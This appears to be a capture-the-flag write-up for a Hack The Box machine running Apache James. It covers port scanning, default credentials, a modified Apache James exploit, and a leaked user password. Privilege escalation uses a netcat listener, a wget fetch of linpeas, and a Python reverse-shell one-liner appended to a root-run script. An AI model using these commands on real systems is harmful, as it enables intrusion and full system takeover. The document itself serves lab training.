# Writeup 
## Recon

### rustscan

```
sudo rustscan -a 10.10.10.51 | tee rustscan.txt
```

![[4fe60e0d33f7e386475e610829045241-1.png]]


### nmapAutomator

```
sudo nmapAutomator.sh -H 10.10.10.51 -t Recon 
```

### ffuf

```
ffuf -ic -t 100 -w /home/kali/HTB/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.10.51/FUZZ -e .php,.txt,.cfg,.conf | tee ffuf-directory-medium.txt
```


### Initial web enumeration

- The website

![[5e631ec2f0b7e0ae25aadb72d4f7850f-1.png]]


### NNTP 

```
telnet 10.10.10.51 119
```

![[fea07999edaff816f826975f524e71b8-1.png]]


## Initial Access

### Trying default creds on Apache James Server 

![[fab6f81321c39f880842ca9573b510ad-1.png]]


### Modifying Apache James exploit

![[765cc29ba85aaeea2142189a507b56ba-1.png]]


### Finding user creds in emails via POP

![[8a7ef8631210d7183f0a93b081fbe614-1.png]]

![[3d755dd5e15a54d1435f1e7df6112e2a-1.png]]

![[5cbcd61be5e642c9f45e5091a8a77ddc-1.png]]

![[1da83b7565748c10ee4d60eb45bc4b5b-1.png]]

![[efcc822e2aecf820bfccf1c81fb65daf-1.png]]

`mindy:P@55W0rd1!2@`

![[df06719c09e0216fade7f39a82a11551-1.png]]

![[602d07187e19807b7438f9356ca9154b-1.png]]



## Privesc

![[ea56a09d7a26117f6d0b36ef44d392e8-1.png]]

- Use the Apache James exploit to bypass limitations of rbash

- On Kali, start netcat listener (w/o rlwrap), then login as mindy with SSH.

```
nc -nvlp 1337
```


### Using linpeas

- As always, transfer `linpeas.sh` onto the target using `wget` to download and a temporary HTTP server on Kali.

```
wget 10.10.14.13/linpeas.sh
sh linpeas.sh | tee linpeas.out
```

![[0742ae633dd342ee9ba1c1bb8e2d1aa4-1.png]]

![[b7c3dcbd4707d5a85a9c594cd9f00c41-1.png]]

![[6186d555d3d1de501934d273a20baae3-1.png]]

![[bc39f5deb06f139053730ea58861048e-1.png]]

### Enumerating environment variables

![[43c7afd914de15cb08285aa3f49bf658-1.png]]

![[eac273cc923a2b22fe18fb06485eb66d-1.png]]

### Modifying /opt/tmp.py for root reverse shell

![[b7b08418143766f253a254998bf31a82-1.png]]

```
echo 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.13",31337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' >> tmp.py
```

![[9e4c6e30216e56daf218e90aa51431c4-1.png]]